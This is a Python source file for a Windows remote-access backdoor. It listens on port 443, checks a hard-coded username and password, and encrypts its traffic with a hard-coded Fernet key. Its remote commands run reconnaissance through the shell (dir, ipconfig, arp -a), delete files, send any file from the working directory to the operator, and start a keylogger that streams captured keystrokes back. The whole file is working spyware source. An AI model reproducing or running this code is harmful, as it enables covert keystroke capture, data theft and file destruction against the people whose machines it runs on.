import socket
import subprocess
import time
import base64
import os
from pynput import keyboard
from datetime import datetime
from cryptography.fernet import Fernet


key = b'dIDIXfq6xvMp0gshF8rI8-AGb41aucYBVR27nQWG2Xc='
cipher = Fernet(key)

VALID_USERNAME = "amirali"
VALID_PASSWORD = "aka271827"

def authenticate():
    connection.send(encode64(b"Username: "))
    username = decode64(connection.recv(1024)).decode().strip()
    connection.send(encode64(b"Password: "))
    password = decode64(connection.recv(1024)).decode().strip()
    if username == VALID_USERNAME and password == VALID_PASSWORD:
        connection.send(encode64(b"Authentication successful"))
        return True
    else:
        connection.send(encode64(b"Authentication failed"))
        return False
def to_1024(data):
    chunk_size = 1024
    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
    return chunks

def encode64(data):
    return cipher.encrypt(data)

def decode64(data):
    return cipher.decrypt(data)

def keylogger(keys: int,BUFFER_SIZE):
    buffer = []
    i = 0
    # with open("keylogs.txt", "a") as log_file:
    def on_press(key):
        nonlocal i
        if i>=keys:
            if buffer:
                data = f'{datetime.now().strftime('%H:%M:%S')} - {"".join(buffer)}'
                connection.send(encode64(data.encode()))
            connection.send(encode64(b'Done'))
            return False      
        try:
            # log_file.write(f"{key.char}")
            key_data = key.char
        except AttributeError:
            special_keys = {
                keyboard.Key.space: " [SPACE] ",
                keyboard.Key.enter: " [ENTER] ",
                keyboard.Key.backspace: " [BACKSPACE] ",
                keyboard.Key.shift: " [SHIFT] ",
                keyboard.Key.ctrl: " [CTRL] ",
                keyboard.Key.alt: " [ALT] "
            }
            # log_file.write(f" {key} ")
            key_data = special_keys.get(key, 'Unknown Key')
        buffer.append(key_data)
        i+=1
        if len(buffer)>= BUFFER_SIZE:
            data = f'{datetime.now().strftime('%H:%M:%S')} - {"".join(buffer)}'
            connection.send(encode64(data.encode()))
            buffer.clear()


    
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server = ('0.0.0.0',443)
sock.bind(server)

sock.listen(1)
print("Listening for connections...")

connection, client_address = sock.accept()
print(f"Connection from {client_address}")


if authenticate():
    while 1:
        data = decode64(connection.recv(1024)).decode()
        if data=="close":
            print("Connection closed by server")
            break
        elif data=="dir":
            print(f"Received: {data}")
            result = encode64(subprocess.run("dir", shell=True, text=True, capture_output=True).stdout.encode())
            chunks = to_1024(result)
            connection.send(encode64(str(len(chunks)).encode()))
            time.sleep(1)
            for chunk in chunks:
                connection.sendall(chunk)
        elif data=="ipconfig":
            print(f"Received: {data}")
            result = encode64(subprocess.run("ipconfig", shell=True, text=True, capture_output=True).stdout.encode())
            chunks = to_1024(result)
            connection.send(encode64(str(len(chunks)).encode()))
            time.sleep(1)
            for chunk in chunks:
                connection.sendall(chunk)
        elif data=="arp -a":
            print(f"Received: {data}")
            result = encode64(subprocess.run("arp -a", shell=True, text=True, capture_output=True).stdout.encode())
            chunks = to_1024(result)
            connection.send(encode64(str(len(chunks)).encode()))
            time.sleep(1)
            for chunk in chunks:
                connection.sendall(chunk)
        elif "del" in data:
            file_name = data.split(" ")[1]
            path = os.path.abspath(os.getcwd())
            try:
                os.remove(f"{path}\\{file_name}")
                connection.send(encode64(b'Done'))
            except:
                connection.send(encode64(b'Wrong file name'))
        elif "download" in data:
            file_name = data.split(" ")[1]
            path = os.path.abspath(os.getcwd())
            try:
                with open(f"{path}\\{file_name}","rb") as file:
                    content = file.read()
                    file.close()
                content = encode64(content)
                chunks = to_1024(content)
                connection.send(encode64(str(len(chunks)).encode()))
                time.sleep(1)
                for chunk in chunks:
                    connection.sendall(chunk)
            except:
                connection.send(encode64(b'Wrong file name'))   
        elif "keylogger" in data:
            keys = int(data.split(" ")[1])
            try:
                size = int(data.split(" ")[2])
            except:
                size = 5
            keylogger(keys,size)
        else:
            print(f"Received: {data.decode()}")
connection.close()